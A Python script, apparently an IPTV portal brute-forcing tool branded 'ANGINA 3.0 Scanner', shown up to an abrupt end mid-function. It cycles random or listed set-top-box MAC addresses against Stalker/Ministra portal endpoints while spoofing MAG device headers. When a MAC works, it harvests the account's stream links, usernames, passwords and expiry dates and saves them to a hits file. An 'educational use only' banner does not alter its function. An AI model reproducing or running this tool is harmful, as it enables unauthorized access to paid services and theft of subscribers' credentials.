import sys
import os
import datetime
import socket
import hashlib
import json
import random
import time
import re
import requests
import subprocess
import pathlib
import threading
import logging
from requests.packages.urllib3.exceptions import InsecureRequestWarning

# Set console title for both Windows and Unix-like systems
NOME = 'ANGINA3'
if os.name == 'nt':  # Windows
    try:
        import ctypes
        ctypes.windll.kernel32.SetConsoleTitleW(NOME)
    except:
        pass
else:  # Unix-like systems (including QPython)
    sys.stdout.write(f'''\x1b]2;{NOME}\x07''')

# Initialize variables
maca = 0
macv = 0
nickn = ""
white = ("""\033[1;37;40m\n""")
if nickn == "":
    nickn = "αηgιηα"

# Try to import and install required modules
try:
    import pip
except ImportError:
    pass

try:
    import requests
except ImportError:
    print("requests module is not installed \n requests module is being installed \n")
    try:
        pip.main(['install', 'requests'])
    except:
        subprocess.check_call([sys.executable, "-m", "pip", "install", "requests"])
    import requests

try:
    import socks
except ImportError:
    print("socks module is not installed \n socks module is being installed \n")
    try:
        pip.main(['install', 'PySocks'])
    except:
        subprocess.check_call([sys.executable, "-m", "pip", "install", "PySocks"])
    import socks

# Clear screen
subprocess.run("cls" if os.name == 'nt' else "clear", shell=True)

# Initialize variables
getmac = ""
oto = 0
tur = 0
Seri = ""
csay = 0

# Configure requests session
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
try:
    import cfscrape
    sesq = requests.Session()
    ses = cfscrape.create_scraper(sess=sesq)
except:
    ses = requests.Session()
logging.captureWarnings(True)

# Clear screen again
subprocess.run("cls" if os.name == 'nt' else "clear", shell=True)

# Initialize counters
say1 = 0
say2 = 0
say = 0
yanpanel = "hata"
imzayan = ""
bul = 0
hitc = 0
prox = 0
cpm = 0

macSayisi = 999999999999991  # 1#deneme sayisı

def print_with_delay(text, delay=0.01):
    for char in text:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(delay)

feyzo = ("""
 \33[1;22m        🖤 🅱🅻🅰🅲🅺 🅷🅴🅰🆁🆃 🅸🅽🅲 🖤                    \33[0m
 \33[2;40m          🖤 𝔸ℕ𝔾𝕀ℕ𝔸™ 𝟛.𝟘 𝕊ℂ𝔸ℕℕ𝔼ℝ 🖤                         \33[0m
  \33[1;41m           🖤 𝔻𝔼𝕍. 𝔹𝕐 𝕀ℕ𝕋𝔼ℕ𝕊𝕀𝕍𝕀𝕊𝕋 🖤             \33[0m

  ⛔ THIS PY IS FOR EDUCATIONAL USE ONLY! ⛔                       
  \33[0m           
   \33[0;1m""")

# Print banner only once
print_with_delay(feyzo)

kisacikti=""
pattern= "(\w{2}:\w{2}:\w{2}:\w{2}:\w{2}:\w{2})"
ozelmac=""
#################
nick='αηgιηα'
bekleme=1
isimle=""

print(feyzo) 
intro=("""\33[1;36m
 ► Default: portal.php
 ----------------------
 01► portal.php
 02► server/load.php
 03► stalker_portal
 04► portalstb/portal.php
 05► k/portal.php(comet)
 06► maglove/portal.php
 07► XUI /c/server/load.php
 08► XUI /c/portal.php
 09► magportal/portal.php 
 10► powerfull/portal.php
 11► magaccess/portal.php
 12► ministra/portal.php
 13► Link Ok/portal.php
 14► delko/portal.php
 15► delko/server/load.php
 16► bStream/server/load.php
 17► bStream/port.php
 18► blowportal.php
 19► P/portal.php 
 20► Client/portal.php
 21► Portalmega/portal.php
 22► Portalmega/portalmega.php
 23► realblue
 
""")
intro=intro+"""\33[1;37;41m ► ENTER TYPE/\033[0m"""

a="""\33[1;37;41m ► PANEL:PORT/\033[0m"""
panel = input(intro)
print('\33[0m')
speed=""
uzmanm2=""
uzmanm="portal.php"
useragent="okhttp/4.7.1"
if  panel=="" or panel=="1":
    	uzmanm="portal.php"
    	useragent="Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3" 
    	panel = input(a)    	
if panel=="2":
    	uzmanm="server/load.php"
    	useragent="Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3"
    	panel = input(a)
if panel=="3":
        uzmanm="stalker_portal/server/load.php"
        useragent="Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3"
        panel = input(a)    	
if panel=="4":
        uzmanm="portalstb/portal.php"
        uzmanm2="/portalstb"
        useragent="Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3"
        panel = input(a) 
if panel=="5":
        uzmanm="k/portal.php"
        uzmanm2="/k"
        useragent="Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3"
        panel = input(a) 
if panel=="6":
        uzmanm="maglove/portal.php"
        uzmanm2="/maglove"
        useragent="Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3"
        panel = input(a) 
if panel=="7":
        uzmanm="c/server/load.php"
        useragent="Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3"
        panel = input(a)
if panel=="8":
        uzmanm="c/portal.php"
        useragent="Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3"
        panel = input(a)    
if panel=="9":
        uzmanm="magportal/portal.php"
        useragent="Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3"
        panel = input(a)
if panel=="10":
       uzmanm="powerfull/portal.php"
       useragent="Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3"
       panel = input(a)     	    
if panel=="11":
       uzmanm="magaccess/portal.php"
       useragent="Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3"
       panel = input(a)  
if panel=="12":
       uzmanm="ministra/portal.php"
       useragent="Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3"
       panel = input(a)     	
if panel=="13":
      uzmanm="Link_OK"
      useragent="Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3"
      panel = input(a) 
if panel=="14":
      uzmanm="delko/portal.php"
      useragent="Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3"
      panel = input(a) 
if panel=="15":
      uzmanm="delko/server/load.php"
      useragent="Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3"
      panel = input(a) 
if panel=="16":
      uzmanm="bStream/server/load.php"
      useragent="Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3"
      panel = input(a) 
if panel=="17":
      uzmanm="bStream/portal.php"
      useragent="Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3"
      panel = input(a) 
if panel=="18":
      uzmanm="blowportal/portal.php"
      useragent="Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3"
      panel = input(a) 
if panel=="19":
      uzmanm="p/portal.php"
      useragent="Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3"
      panel = input(a)  
if panel=="20":
      uzmanm="client/portal.php"
      useragent="Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3"
      panel = input(a)
if panel=="21":
      uzmanm="portalmega/portal.php"
      useragent="Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3"
      panel = input(a) 
if panel=="22":
      uzmanm="portalmega/megaportal.php"
      useragent="Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3"
      panel = input(a)    	  	
realblue=""
if panel=="23":
	realblue="real"
print('\33[1;32m')	



print(panel)

print("\33[1;40m"+feyzo) 
kanalkata="0"

subprocess.run(["clear", ""])
print(feyzo) 
totLen="000000"
dosyaa=""
yeninesil=(
'00:1A:79:',
'10:27:BE:',
'00:1a:79:',
'00:1B:79:',
'00:A1:79:',
'D4:CF:F9:',
'33:44:CF:',
'A0:BB:3E:',
'55:93:EA:',  
'04:D6:AA:',
'11:33:01:',
'00:1C:19:',
'1A:00:6A:',
'1A:00:FB:',
)

if "1"=="1":
 	say=0
 	dsy=""
 	dsy="\n       \33[1;36m ▷ 0 = Random (AUTO MAC)  \33[0m\n"
 	dir='/storage/emulated/0/Downloads/PATHFINDER/combo/'
 	for files in os.listdir (dir):
 		say=say+1
 		dsy=dsy+"	\33[1;92m"+str(say)+" = "+files+'\n'
 	print ("""\33[1;37;41m ► Choose your combo from the list below:\33[0m
"""+dsy+"""
\33[36m ► There are """ +str(say)+""" files in your combo folder.\33[0m
	""")
 	dsyno=str(input(" \33[1;37;41m ► Choose Combo:\33[0m"))
 	say=0
 	
 	if dsyno=="":
 		dsyno="0"
 	if dsyno=="0":
 		
 		print(feyzo) 
 		
 		
 		nnesil=str(yeninesil)
 		nnesil=(nnesil.count(',')+1)
 		for xd in range(0,(nnesil)):
 			tire=' 》'
 			if int(xd) <9:
 				tire='  》'
 			print(str(xd+1)+tire+yeninesil[xd])


 		
 		
 		
 		
 		mactur=input("\33[1;32m ► Choose The Mac Type:\33[0m")
 		if mactur=="":
 			mactur=14
 		print(mactur)
 		mactur=yeninesil[int(mactur)-1]
 		print(mactur)
 		uz=input("""\33[1;32m
 		
 ► Number of Macs to be used:\33[0m
   --------------------------
\33[1;37;41m ► Amount:\33[0m""")
 		if uz=="":
 			uz=30000
 		uz=int(uz) 
 		print(uz)
 	else:
	 	for files in os.listdir (dir):
	 			say=say+1
	 			if dsyno==str(say):
	 				dosyaa=(dir+files)
	 				break
	 	say=0
	 	if not dosyaa=="":
	 		print(dosyaa)
	 	else:
	 		
	 		subprocess.run(["clear", ""])
	 		subprocess.run(["clear", ""])
	 		print("Incorrect combo file selection!")
	 		quit()
	 	c=open(dosyaa, 'r', encoding='utf-8')
	 	totLen=c.readlines()
	 	uz=(len(totLen))
 	
 	
 	subprocess.run(["clear", ""])
 	print(feyzo) 
 	baslama=""

 	if not baslama =="":
 		baslama=int(baslama)
 		csay=baslama
 		
 		
#subproces	s.run(["clear", ""])
#print(feyzo)  	

botsay=input("""

   \33[1;36m ► Number of Bots to use:\33[0m
   \33[1;36m ▷ Bots Range: 1 - 15.
      
  ► Bots:\33[0m""")
subprocess.run(["clear", ""])
print(feyzo)
if botsay=="":
	botsay=int(4)
botsay=int(botsay)
 		
kanalkata="0"
kanalkata=input("""\33[1;36m
 ► Categories to be included:
   --------------------------
\33[1;36m ►00\33[0m = \33[1;92m Connection data only.\33[0m
\33[1;36m ►01\33[0m = \33[1;92m Channels Only.\33[0m
\33[1;36m ►02\33[0m = \33[1;92m All (Live-VOD-Series).\33[0m
	

\33[1;36m ► Enter Answer:\33[0m""")
if kanalkata=="":
	kanalkata="0"


gsay=0
vsay=0

if panel=="" :
    panel="center.chmedia.xyz:8080"

Rhit='\33[33m' 
Ehit='\033[0m' 
panel=panel.replace("http://","")
panel=panel.replace("/c","")
panel=panel.replace("/","")
panel=panel.replace('stalker_portal','/stalker_portal')
tkn1="a"
tkn2="a"
tkn3="a"
tkn4="a"
tkn5="a"
pro1="a"
pro2="a"
pro3="a"
trh1="a"
trh2="a"
trh3="a"
ip=""
fname=""
adult=""
play_token=""
acount_id=""
stb_id=""
stb_type=""
sespas=""
stb_c=""
timezon=""
tloca=""
       
subprocess.run(["clear", ""])
print(feyzo) 
acount_id=""
a="0123456789ABCDEF"
s=-1
ss=0
sss=0
ssss=0
sd=0
vpnsay=0
hitsay=0
onsay=0
sdd=0
vsay=0
bad=0
proxies=""
say=1

folder_name = "Hits"
if not os.path.exists("/storage/emulated/0/Downloads/PATHFINDER/" + folder_name):
    os.mkdir("/storage/emulated/0/Downloads/PATHFINDER/" + folder_name)

Dosyab = "/storage/emulated/0/Downloads/PATHFINDER/" + folder_name + "/" + panel.replace(":", "_").replace("/", "") + "-🖤𝗔𝗡𝗚𝗜𝗡𝗔🖤.txt"
say = 1
def yax(hits):
    dosya = open(Dosyab, 'a+')
    dosya.write(hits)
    dosya.close()

def month_string_to_number(ay):
    m = {
        'jan': 1,
        'feb': 2,
        'mar': 3,
        'apr':4,
         'may':5,
         'jun':6,
         'jul':7,
         'aug':8,
         'sep':9,
         'oct':10,
         'nov':11,
         'dec':12
        }
    s = ay.strip()[:3].lower()

    try:
        out = m[s]
        return out
    except:
        raise ValueError('Not a month')
import time
from datetime import date

def tarih_clear(trh):
	#trh=tarih_exp
	ay=""
	gun=""
	yil=""
	trai=""
	my_date=""
	sontrh=""
	out=""
	ay=str(trh.split(' ')[0])
	gun=str(trh.split(', ')[0].split(' ')[1])
	yil=str(trh.split(', ')[1])
	ay=str(month_string_to_number(ay))
	#print(ay)
	trai=str(gun)+'/'+str(ay)+'/'+str(yil)
	my_date = str(trai)
	#print(my_date)
	if 1==1:
		
		d = date(int(yil), int(ay), int(gun))
		sontrh = time.mktime(d.timetuple())
		out=(int((sontrh-time.time())/86400))
		return out
	#except:pass
	


macs=""	
sayi=1
b1hitc=0
b2hitc=0


def randommac():
	try:
		genmac = str(mactur)+"%02x:%02x:%02x"% ((random.randint(0, 256)),(random.randint(0, 256)),(random.randint(0, 256)))
		#print(genmac)
	except:pass
	genmac=genmac.replace(':100',':10')
	return genmac






url1="http://"+panel+"/"+uzmanm+"?type=stb&action=handshake&prehash=false&JsHttpRequest=1-xml" 


url2="http://"+panel+"/"+uzmanm+"?type=stb&action=get_profile&JsHttpRequest=1-xml" 
if realblue=="real":
	url2="http://"+panel+"/"+uzmanm+"?&action=get_profile&mac="+macs+"&type=stb&hd=1&sn=&stb_type=MAG250&client_type=STB&image_version=218&device_id=&hw_version=1.7-BD-00&hw_version_2=1.7-BD-00&auth_second_step=1&video_out=hdmi&num_banks=2&metrics=%7B%22mac%22%3A%22"+macs+"%22%2C%22sn%22%3A%22%22%2C%22model%22%3A%22MAG250%22%2C%22type%22%3A%22STB%22%2C%22uid%22%3A%22%22%2C%22random%22%3A%22null%22%7D&ver=ImageDescription%3A%200.2.18-r14-pub-250%3B%20ImageDate%3A%20Fri%20Jan%2015%2015%3A20%3A44%20EET%202016%3B%20PORTAL%20version%3A%205.6.1%3B%20API%20Version%3A%20JS%20API%20version%3A%20328%3B%20STB%20API%20version%3A%20134%3B%20Player%20Engine%20version%3A%200x566"
url3="http://"+panel+"/"+uzmanm+"?type=account_info&action=get_main_info&JsHttpRequest=1-xml" 

url5="http://"+panel+"/"+uzmanm+"?action=create_link&type=itv&cmd=ffmpeg%20http://localhost/ch/106422_&JsHttpRequest=1-xml"

url6="http://"+panel+"/"+uzmanm+"?type=itv&action=get_all_channels&force_ch_link_check=&JsHttpRequest=1-xml"

liveurl="http://"+panel+"/"+uzmanm+"?action=get_genres&type=itv&JsHttpRequest=1-xml"

vodurl="http://"+panel+"/"+uzmanm+"?action=get_categories&type=vod&JsHttpRequest=1-xml"

seriesurl="http://"+panel+"/"+uzmanm+"?action=get_categories&type=series&JsHttpRequest=1-xml"




def url(cid):
	url7="http://"+panel+"/"+uzmanm+"?type=itv&action=create_link&cmd=ffmpeg%20http://localhost/ch/"+str(cid)+"_&series=&forced_storage=0&disable_ad=0&download=0&force_ch_link_check=0&JsHttpRequest=1-xml" 
	return url7

def hea1(macs):
	HEADERA={
"User-Agent":"Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 1812 Mobile Safari/533.3" ,
"Referer": "http://"+panel+"/c/" ,
"Accept": "application/json,application/javascript,text/javascript,text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" ,
"Cookie": "mac="+macs+"; stb_lang=en; timezone=Europe/Paris;",
"Accept-Encoding": "gzip, deflate" ,
"Connection": "Keep-Alive" ,
"X-User-Agent":"Model: MAG254; Link: Ethernet",
}
	return 	HEADERA

def hea2(macs,token):
	HEADERd={
"User-Agent":"Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 1812 Mobile Safari/533.3" ,
"Referer": "http://"+panel+"/c/" ,
"Accept": "application/json,application/javascript,text/javascript,text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" ,
"Cookie": "mac="+macs+"; stb_lang=en; timezone=Europe/Paris;",
"Accept-Encoding": "gzip, deflate" ,
"Connection": "Keep-Alive" ,
"X-User-Agent":"Model: MAG254; Link: Ethernet",
"Authorization": "Bearer "+token,
	}
	return HEADERd


def hea3():
	hea={
"Icy-MetaData": "1",
"User-Agent": "Lavf/57.83.100", 
"Accept-Encoding": "identity",
"Host": panel,
"Accept": "*/*",
"Range": "bytes=0-",
"Connection": "close",
	}
	return hea
	

hityaz=0	
	
def hit(mac,trh,real,m3ulink,durum,vpn,livelist,vodlist,serieslist,playerapi,SN,SNENC,SNCUT,DEV,DEVENC,SG,SING,SINGENC):
	global hitr
	global hityaz
	try:
		
		imza="""
🖤 𝗔𝗡𝗚𝗜𝗡𝗔™ 𝟯.𝟬 𝗦𝗖𝗔𝗡𝗡𝗘𝗥 🖤

🕛 𝐒𝐂𝐀𝐍 𝐃𝐀𝐓𝐄-𝐓𝐈𝐌𝐄: """+str(time.strftime("%d-%m-%Y - %H:%M"))+"""
🌐 𝐑𝐄𝐀𝐋: http://"""+str(real)+"""
🅿️ 𝐏𝐀𝐍𝐄𝐋: http://"""+str(panel)+"""/c/
🔑 𝐌𝐀𝐂 𝐂𝐎𝐃𝐄: """+str(mac)+"""
⏰ 𝐄𝐗𝐏𝐈𝐑𝐘 𝐃𝐀𝐓𝐄: """+str(trh)+"""
✅ 𝐌𝐀𝐂 𝐒𝐓𝐀𝐓𝐔𝐒: """+str(durum)+"""
🔒 𝐕𝐏𝐍: """+str(vpn)+""""""+str(playerapi)+"""
🎧 𝐌𝟑𝐔 𝐋𝐈𝐍𝐊: """+str(m3ulink)+"""
🔢 𝐃𝐄𝐕𝐈𝐂𝐄 𝐒𝐍: """+SNENC+"""
✂️ 𝐃𝐄𝐕𝐈𝐂𝐄 𝐒𝐍 𝐂𝐔𝐓: """+SNCUT+"""
📱 𝐃𝐄𝐕𝐈𝐂𝐄 𝟏: """+DEVENC+"""
📲 𝐃𝐄𝐕𝐈𝐂𝐄 𝟐: """+SINGENC+"""

"""
		if  kanalkata=="1" or kanalkata=="2":
			imza=imza+"""📡 𝐋𝐈𝐕𝐄 𝐋𝐈𝐒𝐓:"""+str(livelist)+"""\n
"""
		if kanalkata=="2":
			imza=imza+"""🎭 𝐕𝐎𝐃 𝐋𝐈𝐒𝐓:"""+str(vodlist)+"""

📺 𝐒𝐄𝐑𝐈𝐄𝐒 𝐋𝐈𝐒𝐓:"""+str(serieslist)+"""
"""
		print(imza)#yax(imza)
		hityaz=hityaz+1
		yax(imza)
		print(white)#print(imza)
		if hityaz >= hitc:
			hitr="\33[1;33m"
	except:pass
	
	
cpm=0
cpmx=0
hitr="\33[1;33m"



def echok(mac,bot,total,hitc,oran,tokenr):
	global macv#try:
	global maca#try:  
	global cpm
	global hitr
	try:
	#global cpmx
	
		cpmx=(time.time()-cpm)
		cpmx=(round(60/cpmx))
		#cpm=cpmx
		if str(cpmx)=="0":
			cpm=cpm
		else:
			cpm=cpmx
		echo=("\n┏━► \33[0;44;33m       🖤 𝗔𝗡𝗚𝗜𝗡𝗔™ 𝟯.𝟬 𝗦𝗖𝗔𝗡𝗡𝗘𝗥 🖤        \33[0m\n┣►  \33[0m\33[1;36m🅿️𝗣𝗔𝗡𝗘𝗟▷ "+str(panel)+"  \33[0m \n┣━► \33[0m\33[1;41;37m📥𝗧𝗢𝗞𝗘𝗡▷  \33[0m "+tokenr+str(mac)+" \33[0m\33[1;44;37m⚙𝗖𝗣𝗠► "+str(cpm)+ "    \33[0m\n┣►  \33[1;32m"  +str(bot)+"\33[0m  \33[1;37m🔢𝗧𝗢𝗧𝗔𝗟▷"+str(total)+ "   \33[1;33m "+str(hitr)+"🎯𝗛𝗜𝗧𝗦▷ " +str(hitc)+"   \33[0m\33[1;32m ▷%"+str(oran)+" \33[0m \n┗━► \033[1;44;37m☑𝗠𝗔𝗖 𝗦𝗧𝗔𝗧𝗨𝗦▷ \33[0m \33[1;44;37m✅𝗔𝗖𝗧𝗜𝗩𝗘▷ "+str(maca)+"    \33[0m \033[1;41;37m🛡𝗩𝗣𝗡▷ "+str(macv)+"     \33[0m")
		print(echo)
		cpm=time.time()
	except:pass
			
	

def vpnip(ip):
	url9="https://freegeoip.app/json/"+ip
	vpnip=""
	vpn="〰️Not Invalid 🔵"
	veri=""
	try:
		res = ses.get(url9,  timeout=7, verify=False)
		veri=str(res.text)
	except:
		vpn="〰️Not Invalid 🔵"
	if not '404 page' in veri:
		if 'country_name' in veri:
			vpnc=veri.split('"city":"')[1]
			vpnc=vpnc.split('"')[0]
			vpnips=veri.split('"country_name":"')[1]
			vpn=vpnips.split('"')[0]
			vpn= vpn +' / ' +vpnc
	else:
			vpn="〰️Not Invalid 🔵"
	return vpn


def goruntu(link):
	global macv#try:
	global maca#try:    
	try:
		res = ses.get(link,  headers=hea3(), timeout=(2,5), allow_redirects=False,stream=True)
		duru="✖Need VPN 🛡"
		if res.status_code==302:
			 duru= "✔Active 🎯"
	except:
		duru="✖Need VPN 🛡"
	if duru=="✔Active 🎯":
		maca=maca+1
	else:
		macv=macv+1
	return duru

		
				
tokenr="\33[0m"								
def hitprint(mac,trh):
	sesdosya=sound="/storage/emulated/0/Downloads/PATHFINDER/Sound/hits.mp3"
	file = pathlib.Path(sesdosya)
	try:
		if file.exists():
		    ad.mediaPlay(sesdosya)
		    
	except:pass
	print('   \033[33m🖤 🖤 \033[36mH\033[35mI\033[36mT\033[33m 🖤 🖤\033[0m\n' + str(mac) + '\n' + str(trh))






def list(listlink,macs,token,livel):
	kategori=""
	veri=""
	bag=0
	while True:
		try:
			res = ses.get(listlink,  headers=hea2(macs,token), timeout=15, verify=False)
			veri=str(res.text)
			break
		except:
			bag=bag+1
			time.sleep(1)
			if bag==12:
				break
			
	if veri.count('title":"')>1:
			for i in veri.split('title":"'):
				try:
					kanal=""
					kanal= str((i.split('"')[0]).encode('utf-8').decode("unicode-escape")).replace('\/','/')
				except:pass
				kategori=kategori+kanal+livel
	
	list=kategori
	return list





def m3uapi(playerlink,macs,token):
	mt=""
	bag=0
	
	while True:
			try:
				res = ses.get(playerlink, headers=hea2(macs,token), timeout=7, verify=False)
				veri=""
				veri=str(res.text)
				break
			except:
				time.sleep(1)
				bag=bag+1
				if bag==6:
					break
	try:
			acon=""
			if 'active_cons' in veri:
				acon=veri.split('active_cons":')[1]
				acon=acon.split(',')[0]
				acon=acon.replace('"',"")
				
				
				mcon=veri.split('max_connections":')[1]
				mcon=mcon.split(',')[0]
				mcon=mcon.replace('"',"")
				
				status=veri.split('status":')[1]
				status=status.split(',')[0]
				status=status.replace('"',"")
				
				timezone=veri.split('timezone":"')[1]
				timezone=timezone.split('",')[0]
				timezone=timezone.replace("\/","/")
				
				realm=veri.split('url":')[1]
				realm=realm.split(',')[0]
				realm=realm.replace('"',"")
				
				port=veri.split('port":')[1]
				port=port.split(',')[0]
				port=port.replace('"',"")
				
				userm=veri.split('username":')[1]
				userm=userm.split(',')[0]
				userm=userm.replace('"',"")
				
				
				pasm=veri.split('password":')[1]
				pasm=pasm.split(',')[0]
				pasm=pasm.replace('"',"")
				
				bitism=""
				bitism=veri.split('exp_date":')[1]
				bitism=bitism.split(',')[0]
				bitism=bitism.replace('"',"")
				
				message=veri.split('message":"')[1].split(',')[0].replace('"','')
				
				
				if bitism=="null":
					bitism="Unlimited"
				else:
					bitism=(datetime.datetime.fromtimestamp(int(bitism)).strftime('%d-%m-%Y %H:%M:%S'))
					
				
				
				mt=(""" 
🚪 𝐏𝐎𝐑𝐓: """+port+"""       
👤 𝐔𝐒𝐄𝐑𝐍𝐀𝐌𝐄: """+userm+"""
🔢 𝐏𝐀𝐒𝐒𝐖𝐎𝐑𝐃: """+pasm+"""  
📶 𝐀𝐂𝐓𝐈𝐕𝐄 𝐂𝐎𝐍𝐍𝐄𝐂𝐓𝐈𝐎𝐍𝐒: """+acon+"""  
📊 𝐌𝐀𝐗𝐈𝐌𝐔𝐌 𝐂𝐎𝐍𝐍𝐄𝐂𝐓𝐈𝐎𝐍𝐒: """+mcon+"""  
🔗 𝐒𝐓𝐀𝐓𝐔𝐒: """+status+"""   
🌍 𝐓𝐈𝐌𝐄𝐙𝐎𝐍𝐄: """+timezone+""" """)
	
	except:pass
	return mt
			
			
def d1():
	global hitc
	global hitr
	global tokenr
	for mac in range(1,uz,botsay):
		total=mac
		if dsyno=="0":
			mac=randommac()
		else:
			macv=re.search(pattern,totLen[mac],re.IGNORECASE)
			if macv:
				mac=macv.group()
			else:
				continue
		macs=mac.upper().replace(':','%3A')
		bot="Bot_01"
		oran=""
		oran=round(((total)/(uz)*100),2)
		echok(mac,bot,total,hitc,oran,tokenr)
		bag=0
		veri=""
		while True:
			try:
				res = ses.get(url1, headers=hea1(macs), timeout=15, verify=False)
				veri=str(res.text)
				break
			except:
				bag=bag+1
				time.sleep(1)
				if bag==12:
					break
		tokenr="\33[35m"
		if 'token' in veri:
			tokenr="\33[0m"
			token=veri.replace('{"js":{"token":"',"")
			token=token.split('"')[0]
			bag=0
			while True:
			   try:
			     res = ses.get(url2, headers=hea2(macs,token), timeout=15, verify=False)
			     veri=""
			     veri=str(res.text)
			     break
			   except:
			   	bag=bag+1
			   	time.sleep(1)
			   	if bag==12:
			   		break
			id="null"
			ip=""
			try:
			     id=veri.split('{"js":{"id":')[1]
			     id=id.split(',"name')[0]
			     ip=veri.split('ip":"')[1]
			     ip=ip.split('"')[0]
			except:pass
			if not id=="null":
			    bag=0
			    while True:
			     	try:
				     	res = ses.get(url3, headers=hea2(macs,token), timeout=15, verify=False)
				     	veri=""
				     	veri=str(res.text)
				     	break
			     	except:
				     	bag=bag+1
				     	time.sleep(1)
				     	if bag==12:
				     		break
			    if not veri.count('phone')==0:
			     	hitr="\33[1;36m"
			     	hitc=hitc+1
			     	trh=""
			     	if 'end_date' in veri:
			     		trh=veri.split('end_date":"')[1]
			     		trh=trh.split('"')[0]
			     	else:
			     		  try:
			     		      trh=veri.split('phone":"')[1]
			     		      trh=trh.split('"')[0]
			     		      if trh.lower()[:2] =='un':
			     		      	KalanGun=(" Days")
			     		      else:
			     		      	KalanGun=(str(tarih_clear(trh))+" Days")
			     		      	trh=trh+' '+ KalanGun
			     		  except:pass
			     	hitprint(mac,trh)
			     	bag=0
			     	while True:
			     		try:
				     		res = ses.get(url6, headers=hea2(macs,token), timeout=10, verify=False)
				     		veri=""
				     		veri=str(res.text)
				     		cid=""
				     		cid=(str(res.text).split('ch_id":"')[5].split('"')[0])
				     		break
				     	except:
				     		bag=bag+1
				     		time.sleep(1)
				     		if bag==10:
				     			#quit()
				     			cid="94067"
				     			break
			     	real=panel
			     	m3ulink=""
			     	user=""
			     	pas=""
			     	durum="❌Invalid 🔴"
			     	bag=0
			     	while True:
			     		try:
				     		res = ses.get(url(cid), headers=hea2(macs,token), timeout=15, verify=False)
				     		veri=""
				     		veri=str(res.text)
				     		link=veri.split('ffmpeg ')[1].split('"')[0].replace('\/','/')
				     		real=''+link.split('://')[1].split('/')[0]+'/c/'
				     		user=str(link.replace('live/','').split('/')[3])
				     		pas=str(link.replace('live/','').split('/')[4])
				     		m3ulink="http://"+ real.replace('http://','').replace('/c/', '') + "/get.php?username=" + str(user) + "&password=" + str(pas) + "&type=m3u_plus"
				     		durum=goruntu(link)
				     		break
				     	except:
				     		bag=bag+1
				     		time.sleep(1)
				     		if bag==12:
				     			break
			     	playerapi=""
			     	if not m3ulink=="":
			     		playerlink=str("http://"+real.replace('http://','').replace('/c/','') +"/player_api.php?username="+user+"&password="+pas)
			     		
			     		playerapi=m3uapi(playerlink,macs,token)
			     		if playerapi=="":
			     			playerlink=str("http://"+panel.replace('http://','').replace('/c/','') +"/player_api.php?username="+user+"&password="+pas)
			     			playerapi=m3uapi(playerlink,macs,token)
			     	
			     	SN=(hashlib.md5(mac.encode('utf-8')).hexdigest())
			     	SNENC=SN.upper()
			     	SNCUT=SNENC[:13]
